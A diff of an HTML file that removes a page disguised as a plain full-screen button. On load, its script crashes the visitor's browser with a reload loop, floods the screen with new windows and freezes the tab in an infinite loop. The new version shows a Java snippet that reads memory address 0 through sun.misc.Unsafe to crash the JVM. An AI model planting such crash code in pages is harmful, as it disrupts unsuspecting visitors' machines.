@@ -1,52 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>The Button</title>
-  <style>
-    html, body {
-      margin: 0;
-      height: 100%;
-      background-color: #00f5cc;
-    }
-
-    button {
-      width: 100%;
-      height: 100%;
-      font-size: 40px;
-      font-weight: bold;
-      border: none;
-      background-color: #00f5cc;
-      color: white;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #00f5cc;
-    }
-  </style>
+  <title>Java Unsafe Example</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
 </head>
 <body>
+  <h1>Unsafe Java Memory Access</h1>
+  <pre><code class="language-java">
+public static void main(String... args) throws Exception {
+    getUnsafe().getByte(0);
+}
 
-  <button></button>
-
-  <script>
-    function crash() {
-      // Reload loop
-      setInterval(() => location.reload(true), 1);
-
-      // Flood the browser with new windows
-      setInterval(() => {
-        window.open(window.location.href, '_blank');
-      }, 50);
-
-      // Freeze the tab
-      while (true) {
-        console.log("crash");
-      }
-    }
-
-    window.onload = crash;
-  </script>
-
+private static Unsafe getUnsafe() throws NoSuchFieldException, IllegalAccessException {
+    Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
+    theUnsafe.setAccessible(true);
+    return (Unsafe) theUnsafe.get(null);
+}
+  </code></pre>
 </body>
 </html>
